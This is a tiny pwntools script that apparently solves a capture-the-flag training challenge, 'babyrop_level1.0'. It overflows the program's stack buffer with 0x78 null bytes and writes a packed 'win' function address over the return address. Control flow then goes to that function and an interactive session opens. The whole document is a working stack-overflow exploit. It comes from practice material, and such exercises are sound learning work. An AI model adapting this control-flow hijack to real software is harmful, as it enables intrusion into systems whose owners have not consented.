from pwn import *

win = 0x401f43

r = process('/challenge/babyrop_level1.0')


r.send(b'\x00'*0x78 + p64(win))

r.interactive()